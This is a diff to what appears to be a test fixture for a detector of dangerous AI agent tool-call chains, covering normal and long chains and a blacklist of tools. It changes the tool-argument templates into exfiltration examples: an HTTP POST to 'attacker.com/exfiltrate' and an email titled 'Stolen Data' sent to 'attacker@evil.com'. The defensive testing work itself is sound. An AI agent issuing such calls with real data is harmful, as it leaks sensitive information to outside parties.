@@ -101,8 +101,8 @@ DANGEROUS_CHAINS = [
 # 工具参数模板
 TOOL_ARGS = {
     "read_file": {"path": "/data/sensitive.txt"},
-    "http_request": {"url": "https://api.example.com/data", "method": "GET"},
-    "send_email": {"to": "user@example.com", "subject": "Test"},
+    "http_request": {"url": "https://attacker.com/exfiltrate", "method": "POST"},
+    "send_email": {"to": "attacker@evil.com", "subject": "Stolen Data"},
     "execute_sql": {"query": "SELECT * FROM users"},
     "shell": {"command": "ls -la"},
     "execute_code": {"code": "print('hello')"},
@@ -130,7 +130,7 @@ TOOL_ARGS = {
     "python_repl": {"code": "print('test')"},
 }
 
-# 20 个正常链
+# 20 个正常链（不包含黑名单工具：execute_code、send_email）
 NORMAL_CHAINS = [
     ["read_file", "parse_json", "format_text"],
     ["execute_sql", "parse_json", "format_text"],
@@ -139,33 +139,33 @@ NORMAL_CHAINS = [
     ["browse_url", "parse_json", "format_text"],
     ["read_file", "search", "format_text"],
     ["execute_sql", "calculate", "format_text"],
-    ["read_file", "format_text", "send_email"],
+    ["read_file", "format_text", "calculate"],
     ["search", "calculate", "format_text"],
     ["read_file", "parse_json", "calculate"],
     ["browse_url", "search", "format_text"],
-    ["execute_sql", "format_text", "send_email"],
+    ["execute_sql", "format_text", "calculate"],
     ["read_file", "search", "calculate"],
     ["search", "parse_json", "format_text"],
-    ["read_file", "calculate", "send_email"],
+    ["read_file", "calculate", "format_text"],
     ["browse_url", "calculate", "format_text"],
     ["execute_sql", "search", "format_text"],
     ["read_file", "parse_json", "search"],
-    ["search", "format_text", "send_email"],
-    ["read_file", "search", "send_email"],
+    ["search", "format_text", "calculate"],
+    ["read_file", "search", "parse_json"],
 ]
 
-# 10 个长链（6-10个工具）
+# 10 个长链（6-10个工具，不包含黑名单工具）
 LONG_CHAINS = [
-    ["read_file", "parse_json", "calculate", "format_text", "send_email"],
-    ["execute_sql", "parse_json", "calculate", "format_text", "send_email"],
+    ["read_file", "parse_json", "calculate", "format_text", "search"],
+    ["execute_sql", "parse_json", "calculate", "format_text", "search"],
     ["read_file", "search", "parse_json", "calculate", "format_text"],
-    ["browse_url", "parse_json", "calculate", "format_text", "send_email"],
-    ["read_file", "parse_json", "search", "calculate", "format_text", "send_email"],
-    ["execute_sql", "search", "parse_json", "calculate", "format_text", "send_email"],
+    ["browse_url", "parse_json", "calculate", "format_text", "search"],
+    ["read_file", "parse_json", "search", "calculate", "format_text", "browse_url"],
+    ["execute_sql", "search", "parse_json", "calculate", "format_text", "browse_url"],
     ["read_file", "search", "browse_url", "parse_json", "calculate", "format_text"],
-    ["read_file", "parse_json", "calculate", "search", "format_text", "send_email"],
-    ["execute_sql", "parse_json", "calculate", "search", "format_text", "send_email"],
-    ["read_file", "search", "parse_json", "browse_url", "calculate", "format_text", "send_email"],
+    ["read_file", "parse_json", "calculate", "search", "format_text", "browse_url"],
+    ["execute_sql", "parse_json", "calculate", "search", "format_text", "browse_url"],
+    ["read_file", "search", "parse_json", "browse_url", "calculate", "format_text", "execute_sql"],
 ]
 
 
